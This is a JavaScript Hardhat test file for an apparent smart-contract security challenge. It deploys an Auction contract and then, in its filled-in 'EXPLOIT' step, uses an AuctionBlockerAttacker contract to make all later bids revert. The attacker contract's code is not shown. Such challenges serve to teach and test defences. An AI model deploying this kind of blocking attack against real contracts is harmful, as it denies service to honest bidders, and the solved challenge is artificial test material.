const { expect } = require('chai');
const { ethers, waffle } = require('hardhat');

describe('Auction', function () {
  const bidAmount = ethers.utils.parseEther('0');
  function nextBidAmount() {
    return bidAmount.add(1);
  }

  let deployer, attacker, bidder;
  let auctionContract;

  before(async function () {
    //
    // SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
    //

    [deployer, attacker, bidder] = await ethers.getSigners();

    const auctionFactory = await ethers.getContractFactory('Auction');
    auctionContract = await auctionFactory.deploy();
    await auctionContract.deployed();

    auctionContract = await auctionContract.connect(bidder);

    const bidTxn = await auctionContract.bid({ value: nextBidAmount() });
    await bidTxn.wait();
  });

  describe('EXPLOIT', function () {
    let auctionBlockerAttackerContract;

    before(async function () {
      //
      // CHALLENGE: SETUP AND EXECUTE THE EXPLOIT HERE
      //

      const auctionBlockerAttackerContractFactory = await ethers.getContractFactory('AuctionBlockerAttacker', attacker);
      auctionBlockerAttackerContract = await auctionBlockerAttackerContractFactory.deploy(auctionContract.address);
      await auctionBlockerAttackerContract.deployed();

      const blockAuctionTxn = await auctionBlockerAttackerContract.blockAuction({value: nextBidAmount() });
      await blockAuctionTxn.wait();
    });

    it('attacker should be able to block the auction from receiving new bids', async function () {
      //
      // ASSERTING AUCTION IS BLOCKED - NO NEED TO CHANGE ANYTHING HERE
      //
      await expect(auctionContract.bid({ value: nextBidAmount() })).to.be.reverted;
    });
  });
});
